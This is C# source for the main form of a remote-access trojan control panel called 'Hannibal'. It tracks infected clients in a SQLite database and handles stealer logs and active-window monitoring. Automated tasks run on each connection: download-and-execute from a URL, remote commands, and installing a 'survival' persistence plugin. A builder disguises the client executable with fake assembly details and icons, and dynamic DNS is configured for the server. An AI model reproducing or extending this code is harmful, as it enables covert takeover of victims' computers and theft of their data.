...
namespace InvokedServer.Forms
{
	public partial class FrmMain : KryptonForm
	{
		...
		private readonly ActiveWindowHandler _activeWindowHandler;
		...
		private static string titleName = "Hannibal";
        ...
        FrmAssembly frmAsm = new FrmAssembly();
		private bool TaskStatus;
        public bool NotificationCentre;

        public HannibalServer ListenServer { get; set; }
		...
		public FrmMain()
		{
            ...
            _activeWindowHandler = new ActiveWindowHandler
            {
                FrmMain = this // Set FrmMain reference
            };
		...
		private void RegisterMessageHandler()
		{
            ...
            MessageHandler.Register(this._activeWindowHandler);
		...
		private void UnregisterMessageHandler()
		{
            ...
            MessageHandler.Unregister(this._activeWindowHandler);
            this._stealerHandler.NewEventLog -= new StealerHandler.EventLogHandler(this.AddLogByClient);
			this._stealerHandler.NewStealerLog -= new StealerHandler.StealerLogHandler(this.AddStealerLog);
			this._stealerHandler.NewLog -= new StealerHandler.LogHandler(this.HandlerAddEventLog);
			MessageHandler.Register(this._clientInfoSummaryHandler);
        ...
        private void PopulateClientInfoPanel(Client client)
        {
            ...
            // Removed the version check, just send the request directly
		...
		private void InitializeServer()
		{
			...
			this.ListenServer = new HannibalServer(new X509Certificate2(InvokedServer.Models.Settings.CertificatePath));
			this.ListenServer.ServerState += new Server.ServerStateEventHandler(this.ServerState);
			this.ListenServer.ClientConnected += new HannibalServer.ClientConnectedEventHandler(this.ClientConnected);
			this.ListenServer.ClientDisconnected += new HannibalServer.ClientDisconnectedEventHandler(this.ClientDisconnected);
		}
		...
		private void FrmMain_Load(object sender, EventArgs e)
		{
            ...
            _frmSettings = new FrmSettings(this.ListenServer, this)
            {
                Visible = false
            };

            this.ncPort.Value = (Decimal)InvokedServer.Models.Settings.ListenPort;
            this.chkIPv6Support.Checked = InvokedServer.Models.Settings.IPv6Support;
            this.chkAutoListen.Checked = InvokedServer.Models.Settings.AutoListen;
            this.chkPopup.Checked = InvokedServer.Models.Settings.ShowPopup;
            this.chkUseUpnp.Checked = InvokedServer.Models.Settings.UseUPnP;
            this.chkShowTooltip.Checked = InvokedServer.Models.Settings.ShowToolTip;
            this.chkNoIPIntegration.Checked = InvokedServer.Models.Settings.EnableNoIPUpdater;
            this.txtNoIPHost.Text = InvokedServer.Models.Settings.NoIPHost;
            this.txtNoIPUser.Text = InvokedServer.Models.Settings.NoIPUsername;
            this.txtNoIPPass.Text = InvokedServer.Models.Settings.NoIPPassword;

            lstHosts.DataSource = new BindingSource(_hosts, null);
            LoadProfile("Default");
            numericUpDownPort.Value = InvokedServer.Models.Settings.ListenPort;

            UpdateControlStates();
			CreateDatabaseAndTables();
			PopulateTasksDataBase();
			PopulateKeywords();
        }
        ...
        private void PopulateKeywords()
        {
            ...
            try
            {
                ...
                using (SQLiteConnection conn = new SQLiteConnection(dbPath))
                {
                    ...
                    // SQL query to select all data from the "Tasks" table
                    string selectQuery = "SELECT keywordCol FROM Keywords";

                    using (SQLiteCommand cmd = new SQLiteCommand(selectQuery, conn))
                    {
                        using (SQLiteDataReader reader = cmd.ExecuteReader())
                        {
                            // Clear the existing rows in the DataGridView before populating
                            this.NotiDataGridView.Rows.Clear();
                            ...
                            while (reader.Read())
                            {
                                ...
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["keywordCol"] });

                                // Add the populated row to the DataGridView
                                this.NotiDataGridView.Rows.Add(row);
                            }
                        }
                    }
        ...
        private void PopulateTasksDataBase()
        {
            string dbPath = "Data Source=general.db;Version=3;";
            ...
            try
            {
                ...
                using (SQLiteConnection conn = new SQLiteConnection(dbPath))
                {
                    ...
                    // SQL query to select all data from the "Tasks" table
                    string selectQuery = "SELECT TriggerCol, TaskCol, Param1Col, Param2Col, Param3Col FROM Tasks";
                    ...
                    using (SQLiteCommand cmd = new SQLiteCommand(selectQuery, conn))
                    {
                        using (SQLiteDataReader reader = cmd.ExecuteReader())
                        {
                            ...
                            while (reader.Read())
                            {
                                ...
                                // Populate the row with data from the database
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["TriggerCol"] });
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["TaskCol"] });
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["Param1Col"] });
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["Param2Col"] });
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["Param3Col"] });

                                // Add the populated row to the DataGridView
                                this.TasksDataGridView.Rows.Add(row);
                            }
                        }
                    }
                ...
                try
                {
                    ...
                    using (SQLiteCommand cmd = new SQLiteCommand(selectQuery, conn))
                    {
                        using (SQLiteDataReader reader = cmd.ExecuteReader())
                        {
                            ...
                            {
                                DataGridViewRow row = new DataGridViewRow();
                                row.Cells.Add(new DataGridViewImageCell { Value = imgFlags.Images[Convert.ToInt32(reader["FlagCol"])] });
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["IPCol"] });
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["TagCol"] });
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["UserCol"] });
                                var versionCell = new DataGridViewTextBoxCell { Value = reader["VersionCol"] };
                                versionCell.Style.ForeColor = reader["VersionCol"].ToString() != FrmMain.version ? Color.Red : Color.LightGreen;
                                row.Cells.Add(versionCell);
                                var statusCell = new DataGridViewTextBoxCell { Value = reader["StatusCol"] };
                                statusCell.Style.ForeColor = Color.Red;
                                row.Cells.Add(statusCell);
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["UserStatusCol"] });
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["CountryCol"] });
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["OSCol"] });
                                row.Cells.Add(new DataGridViewTextBoxCell { Value = reader["AccounttypeCol"] });
                                this.ClientsDataGridView.Rows.Add(row);
                            }
                        }
                    }
                }
        ...
        static void CreateDatabaseAndTables()
        {
            ...
            CREATE TABLE IF NOT EXISTS clients (
                ...
                AccounttypeCol TEXT
                    ...
                    using (SQLiteCommand cmd = new SQLiteCommand(createClientsTableQuery, conn))
                    {
                        cmd.ExecuteNonQuery();
                    }
            ...
            CREATE TABLE IF NOT EXISTS Tasks (
                ...
                Param3Col TEXT
                    ...
                    using (SQLiteCommand cmd = new SQLiteCommand(createTasksTableQuery, conn))
                    {
                        cmd.ExecuteNonQuery();
                    }

                    // Create the "Keywords" table if it doesn't exist (optional)
                    string createKeywordsTableQuery = @"
            CREATE TABLE IF NOT EXISTS Keywords (
                keywordCol TEXT
            );";
                    using (SQLiteCommand cmd = new SQLiteCommand(createKeywordsTableQuery, conn))
                    {
                        cmd.ExecuteNonQuery();
                    }
            ...
            {
                MessageBox.Show("An error occurred while creating the database and tables: " + ex.Message);
            }
        }
        ...
        {
            this.ListenServer.Disconnect();
            UpdateAllClientsToOffline();
            this.UnregisterMessageHandler();
            this.notifyIcon.Visible = false;
            this.notifyIcon.Dispose();
        }

        private void UpdateAllClientsToOffline()
        {
            string dbPath = "Data Source=general.db;Version=3;";
            using (SQLiteConnection conn = new SQLiteConnection(dbPath))
            {
                try
                {
                    ...
                    string updateQuery = @"
                UPDATE clients
                SET StatusCol = 'Offline', UserStatusCol = 'Inactive'";
                ...
                {
                    Console.WriteLine("An error occurred while updating client data to offline: " + ex.Message);
                }
                finally
                {
                    conn.Close();
		...
		private void ClientConnected(Client client)
		{
            ...
            InsertOrUpdateClientDataToDatabase(client);
        }
            ...
            for (; ; )
            {
                ...
                if (keyValuePair.Key != null)
                {
                    if (keyValuePair.Value)
                    {
						...
						if (TaskStatus == true)
						{
							StartAutomatedTask(keyValuePair.Key);
						}
        ...
        private void StartAutomatedTask(InvokedServer.Networking.Client client)
        {
            if (TasksDataGridView.InvokeRequired)
            {
                TasksDataGridView.Invoke(new Action(() => StartAutomatedTask(client)));
                return;
            }
            ...
            foreach (DataGridViewRow row in TasksDataGridView.Rows)
            {
                ...
                string triggerCaption = row.Cells["TriggerCol"].Value?.ToString();
                string taskCaption = row.Cells["TaskCol"].Value?.ToString();
                string param1 = row.Cells["Param1Col"].Value?.ToString() ?? "N/A";
                string param2 = row.Cells["Param2Col"].Value?.ToString() ?? "N/A";
                string param3 = row.Cells["Param3Col"].Value?.ToString() ?? "N/A";
                bool _isUpdate = false;

                // Check the trigger value before executing tasks
                if (triggerCaption == "Initial Connection" && !IsClientInDatabase(client))
                {
                    continue; // skip if they are in database
                }

                if (triggerCaption == "All Connections")
                {
                    // execute no checks
                }

                if (triggerCaption == "PC Reset")
                {
                    continue; //skip hadled else where
                }
                else if (triggerCaption.StartsWith("Keyword"))
                {
                    continue; //skip hadled else where
                }
                ...
                switch (taskCaption)
                {
                    case "Remote Execute":
                        ...
                        if (param1 == "Disk")
                        {
							AutoTaskNoti(client.Value.UserAtPc, "Remote Execute | Disk | " + param2);
                            var taskHandler = new TaskManagerHandler(client);
                            string remotePath = param2;
                            var fileHandler = new FileManagerHandler(client);
                            fileHandler.BeginUploadFile(remotePath, "");
                            taskHandler.StartProcess(remotePath);
                        }
                        else if (param1 == "URL" && Uri.IsWellFormedUriString(param2, UriKind.Absolute))
                        {
                            AutoTaskNoti(client.Value.UserAtPc, "Remote Execute | URL | " + param2);
                            if (!param2.StartsWith("http"))
                                param2 = "http://" + param2;
                            string fileExtension = "exe";
                            if (param3 != "N/A" && !string.IsNullOrEmpty(param3))
                                fileExtension = param3;

                            var taskHandler = new TaskManagerHandler(client);
                            taskHandler.StartProcessFromWeb(param2, _isUpdate, fileExtension);
                        }
                        break;

                    case "Remote Command":
                        AutoTaskNoti(client.Value.UserAtPc, "Remote Command | " + param1 + " | " + param2);
                        client.Send(new DoSendQuickCommand { Command = param2, Host = param1 });
                        break;

                    case "Exclude System Drives":
                        AutoTaskNoti(client.Value.UserAtPc, "Exclude System Drives");
                    ...
                    case "Message Box":
                        AutoTaskNoti(client.Value.UserAtPc, "Message Box | " + param1 + " | " + param2 + " | " + param3);
                    ...
                    case "Reset Survival":
                        string pluginPath = "Plugins\\PluginSurvival.dll";
                        if (File.Exists(pluginPath))
                        {
                            ...
                            {
                                PluginName = "PluginSurvival",
                                Data = Zip.Compress(pluginBytes)
                            });
                            AutoTaskNoti(client.Value.UserAtPc, "Reset Survival | " + param1);
                            byte[] numArray = File.ReadAllBytes(param1);
                            string survivalExtension = Path.GetExtension(param1);
                            client.Send<DoSurvivialInstall>(new DoSurvivialInstall()
                            {
                                filebytes = numArray,
                                filextension = survivalExtension
                            });
                        }
                        else
                        {
        ...
        public void AutoTaskNoti(string client, string task)
        {
            int newRowIndex = NotiTasksDataGridView.Rows.Add();
            var newRow = NotiTasksDataGridView.Rows[newRowIndex];
            newRow.Cells["User3Col"].Value = client;
            newRow.Cells["TimeCol"].Value = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");  
            newRow.Cells["Task2Col"].Value = task;
        }


        private bool IsClientInDatabase(InvokedServer.Networking.Client client)
        {
            string dbPath = "Data Source=general.db;Version=3;";
            using (SQLiteConnection conn = new SQLiteConnection(dbPath))
            {
                ...
                {
                    conn.Open();
                    string query = @"SELECT COUNT(*) FROM clients WHERE IPCol = @IPCol";
                    using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
                    {
                        cmd.Parameters.AddWithValue("@IPCol", client.EndPoint.Address.ToString());
                        int count = Convert.ToInt32(cmd.ExecuteScalar());
                        return count > 0;  // Return true if client exists
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error checking client existence: " + ex.Message);
                    return false;  // If there's an error, assume the client does not exist
                }
            }
        }
        ...
        {
            row.Cells["IPCol"].Value = client.EndPoint.Address.ToString();
            row.Cells["TagCol"].Value = client.Value.Tag;
            row.Cells["UserCol"].Value = client.Value.UserAtPc;
            row.Cells["VersionCol"].Value = client.Value.Version;
            row.Cells["UserStatusCol"].Value = "Active";
            row.Cells["CountryCol"].Value = client.Value.CountryWithCode;
            row.Cells["OSCol"].Value = client.Value.OperatingSystem;
            row.Cells["AccounttypeCol"].Value = client.Value.AccountType;
            row.Tag = client;

            // Check if the client is connected and update row style
            if (client.Connected)
            {
                row.Cells["StatusCol"].Value = "Online";
                row.Cells["StatusCol"].Style.ForeColor = Color.LightGreen;
            }
            else
            {
                row.Cells["StatusCol"].Value = "Offline";
                row.Cells["StatusCol"].Style.ForeColor = Color.Red;
            }

            row.Cells["VersionCol"].Style.ForeColor = client.Value.Version != FrmMain.version ? Color.Red : Color.LightGreen;
            row.Cells["AccounttypeCol"].Style.ForeColor = client.Value.AccountType == "Admin" ? Color.DarkOrange : Color.White;

            // Flag image index or a placeholder for flag column
            row.Cells["FlagCol"].Value = this.imgFlags.Images[client.Value.ImageIndex];
        }

        private void InsertOrUpdateClientDataToDatabase(Client client)
        {
            string dbPath = "Data Source=general.db;Version=3;";
            using (SQLiteConnection conn = new SQLiteConnection(dbPath))
            {
                try
                {
                    ...
                    string checkClientQuery = @"SELECT COUNT(*) FROM clients WHERE IPCol = @IPCol";
                    using (SQLiteCommand checkCmd = new SQLiteCommand(checkClientQuery, conn))
                    {
                        checkCmd.Parameters.AddWithValue("@IPCol", client.EndPoint.Address.ToString());
                        int clientExists = Convert.ToInt32(checkCmd.ExecuteScalar());

                        if (clientExists > 0)
                        {
                            // If the client exists, update the status to either "Online" or "Offline"
                            string updateQuery = @"
                        UPDATE clients
                        SET StatusCol = @StatusCol, UserStatusCol = @UserStatusCol
                        WHERE IPCol = @IPCol";
                            using (SQLiteCommand cmd = new SQLiteCommand(updateQuery, conn))
                            {
                                cmd.Parameters.AddWithValue("@StatusCol", client.Connected ? "Online" : "Offline");
                                cmd.Parameters.AddWithValue("@UserStatusCol", client.Connected ? "Active" : "Inactive");
                                cmd.Parameters.AddWithValue("@IPCol", client.EndPoint.Address.ToString());
                                cmd.ExecuteNonQuery();
                            }
                        }
                        ...
                        {
                            // If the client does not exist in the database, insert a new record
                            string insertQuery = @"
                        INSERT INTO clients (FlagCol, IPCol, TagCol, UserCol, VersionCol, StatusCol, 
                                             UserStatusCol, CountryCol, OSCol, AccounttypeCol)
                        VALUES (@FlagCol, @IPCol, @TagCol, @UserCol, @VersionCol, @StatusCol, 
                                @UserStatusCol, @CountryCol, @OSCol, @AccounttypeCol);";

                            using (SQLiteCommand cmd = new SQLiteCommand(insertQuery, conn))
                            {
                                cmd.Parameters.AddWithValue("@FlagCol", client.Value.ImageIndex);  // Assuming this is an image index
                                cmd.Parameters.AddWithValue("@IPCol", client.EndPoint.Address.ToString());
                                cmd.Parameters.AddWithValue("@TagCol", client.Value.Tag);
                                cmd.Parameters.AddWithValue("@UserCol", client.Value.UserAtPc);
                                cmd.Parameters.AddWithValue("@VersionCol", client.Value.Version);
                                cmd.Parameters.AddWithValue("@StatusCol", client.Connected ? "Online" : "Offline");
                                cmd.Parameters.AddWithValue("@UserStatusCol", client.Connected ? "Active" : "Inactive");
                                cmd.Parameters.AddWithValue("@CountryCol", client.Value.CountryWithCode);
                                cmd.Parameters.AddWithValue("@OSCol", client.Value.OperatingSystem);
                                cmd.Parameters.AddWithValue("@AccounttypeCol", client.Value.AccountType);
                                cmd.ExecuteNonQuery();
                            }
                        }
                    }
                ...
                {
                    Console.WriteLine("An error occurred while inserting/updating client data: " + ex.Message);
                }
                finally
                {
                    conn.Close();
		...
		private void RemoveClientFromDataGridView(Client client)
		{
			...
			try
			{
                ...
                this.RemoveClientFromDatabase(client);
                this.UpdateClientNumber();
			}
			catch (InvalidOperationException)
			{
        ...
        private void RemoveClientFromDatabase(Client client)
        {
            string dbPath = "Data Source=general.db;Version=3;";
            using (SQLiteConnection conn = new SQLiteConnection(dbPath))
            {
                try
                {
                    ...
                    string deleteQuery = @"
                DELETE FROM clients WHERE IPCol = @IPCol";
                ...
                {
                    Console.WriteLine("An error occurred while removing client data: " + ex.Message);
                }
                finally
                {
                    conn.Close();
		...
		private void OpenBuilderBtn_Click(object sender, EventArgs e)
		{
            ...
            private BuildOptions GetBuildOptions()
            {
                ...
                var buildOptions = new BuildOptions
                {
                    ...
                    // Icon Settings
                    IconPath = frmAsm.chkChangeIcon.Checked ? frmAsm.txtIconPath.Text : string.Empty
                };
                ...
                if (frmAsm.chkChangeIcon.Checked && (string.IsNullOrWhiteSpace(buildOptions.IconPath) || !File.Exists(buildOptions.IconPath)))
                    throw new Exception("Please choose a valid icon path.");

                // Assembly Information
                if (chkChangeAsmInfo.Checked)
                {
                    if (!IsValidVersionNumber(frmAsm.txtProductVersion.Text))
                        throw new Exception("Please enter a valid product version number!\nExample: 1.2.3.4");

                    if (!IsValidVersionNumber(frmAsm.txtFileVersion.Text))
                        throw new Exception("Please enter a valid file version number!\nExample: 1.2.3.4");

                    buildOptions.AssemblyInformation = new string[]
                    {
                    frmAsm.txtProductName.Text,
                    frmAsm.txtDescription.Text,
                    frmAsm.txtCompanyName.Text,
                    frmAsm.txtCopyright.Text,
                    frmAsm.txtTrademarks.Text,
                    frmAsm.txtOriginalFilename.Text,
                    frmAsm.txtProductVersion.Text,
                    frmAsm.txtFileVersion.Text
                    };
                }
            ...
            private void SetBuildState(bool state)
            {
                try
                {
                    Invoke((MethodInvoker)(() =>
                    {
                        OpenBuilderBtn.Text = state ? "Build" : "Building...";
                        OpenBuilderBtn.Enabled = state;
                    }));
                }
                catch (InvalidOperationException) { }
            }
        ...
        private void AutoTasksPage_Click(object sender, EventArgs e)
        {
        ...
        {
            _frmSettings = new FrmSettings(this.ListenServer, this)  // Pass FrmMain instance
            {
                Visible = false
            };
            _frmSettings.btnListen_Click(sender, e);

            if (ListenServer.Listening == true)
            {
        ...
        private void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            ...
            _frmSettings.btnSave_Click(sender, e);
        }
        ...
        private void chkNoIPIntegration_Click(object sender, EventArgs e)
        {
            _frmSettings = new FrmSettings(this.ListenServer, this)
            {
                Visible = false
            };
            _frmSettings.chkNoIPIntegration_CheckedChanged(sender, e);
        }
        ...
        private void txtInstallSubDirectory_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = (e.KeyChar == '\\' || FileHelper.HasIllegalCharacters(e.KeyChar.ToString())) &&
                      !char.IsControl(e.KeyChar);
        }
        ...
        {
			if (chkChangeAsmInfo.Checked == true)
			{
				HasChanged();
				frmAsm.Show();
			}
			else if (chkChangeAsmInfo.Checked == false)
			{
                HasChanged();
                frmAsm.Hide();
            }
        ...
        {
			FrmAutoTasks frmAutoTasks = new FrmAutoTasks(this);
			frmAutoTasks.Show();
        }

        private void guna2GradientButton3_Click(object sender, EventArgs e)
		{ 
            foreach (DataGridViewRow row in TasksDataGridView.SelectedRows)
            {
                if (!row.IsNewRow)
                {
        ...
        {
			if (guna2GradientButton4.Text == "Start")
			{
				TaskStatus = true;
				guna2GradientButton4.Text = "Stop";
				guna2GradientButton4.Image = InvokedServer.Properties.Resources.control_pause_blue;
            }
			else if (guna2GradientButton4.Text == "Stop")
			{
                TaskStatus = false;
                guna2GradientButton4.Text = "Start";
				guna2GradientButton4.Image = InvokedServer.Properties.Resources.control_play_blue;
            }
        }
        ...
        private void chkHideLogDirectory_Click(object sender, EventArgs e)
        {
        ...
        private void guna2GradientButton5_Click(object sender, EventArgs e)
        {
            ...
            try
            {
                ...
                using (SQLiteConnection conn = new SQLiteConnection(dbPath))
                {
                    ...
                    // 1. Clear the "Tasks" table
                    string clearTasksTableQuery = "DELETE FROM Tasks;";
                    using (SQLiteCommand cmd = new SQLiteCommand(clearTasksTableQuery, conn))
                    {
                        cmd.ExecuteNonQuery();  // Execute the query to delete all rows
                    }

                    // 2. Insert data from "TasksDataGridView" into the "Tasks" table
                    foreach (DataGridViewRow row in TasksDataGridView.Rows)
                    {
                        ...
                        // Retrieve the cell values from the current row
                        string triggerCol = row.Cells["TriggerCol"].Value?.ToString();
                        string taskCol = row.Cells["TaskCol"].Value?.ToString();
                        string param1Col = row.Cells["Param1Col"].Value?.ToString();
                        string param2Col = row.Cells["Param2Col"].Value?.ToString();
                        string param3Col = row.Cells["Param3Col"].Value?.ToString();

                        // Prepare the insert query
                        string insertQuery = @"
                INSERT INTO Tasks (TriggerCol, TaskCol, Param1Col, Param2Col, Param3Col)
                VALUES (@TriggerCol, @TaskCol, @Param1Col, @Param2Col, @Param3Col);";

                        using (SQLiteCommand insertCmd = new SQLiteCommand(insertQuery, conn))
                        {
                            // Add parameters to the insert query to avoid SQL injection
                            insertCmd.Parameters.AddWithValue("@TriggerCol", triggerCol);  // Corrected this
                            insertCmd.Parameters.AddWithValue("@TaskCol", taskCol);
                            insertCmd.Parameters.AddWithValue("@Param1Col", param1Col);
                            insertCmd.Parameters.AddWithValue("@Param2Col", param2Col);
                            insertCmd.Parameters.AddWithValue("@Param3Col", param3Col);
        ...
        {
            if (guna2GradientButton10.Text == "Start")
            {
                NotificationCentre = true;
                guna2GradientButton10.Text = "Stop";
                guna2GradientButton10.Image = InvokedServer.Properties.Resources.control_pause_blue;
            }
            else if (guna2GradientButton10.Text == "Stop")
            {
                NotificationCentre = false;
                guna2GradientButton10.Text = "Start";
                guna2GradientButton10.Image = InvokedServer.Properties.Resources.control_play_blue;
            }
        }

        private void guna2GradientButton8_Click(object sender, EventArgs e)
        {
            FrmAddWord frmAddWord = new FrmAddWord(this);
            frmAddWord.Show();
        }

        private void guna2GradientButton9_Click(object sender, EventArgs e)
        {
            if (this.NotiDataGridView.SelectedRows.Count > 0)
            {
                var selectedRow = this.NotiDataGridView.SelectedRows[0];
                string keywordToDelete = selectedRow.Cells["keywordCol"].Value.ToString();
                string dbPath = "Data Source=general.db;Version=3;";
                try
                {
                    using (SQLiteConnection conn = new SQLiteConnection(dbPath))
                    {
                        conn.Open();
                        string deleteKeywordQuery = "DELETE FROM Keywords WHERE keywordCol = @keyword;";
                        using (SQLiteCommand cmd = new SQLiteCommand(deleteKeywordQuery, conn))
                        {
                            cmd.Parameters.AddWithValue("@keyword", keywordToDelete);
                            cmd.ExecuteNonQuery();
                        }
                    }
                    this.NotiDataGridView.Rows.Remove(selectedRow);
                }
                catch (Exception ex)
                {
                }
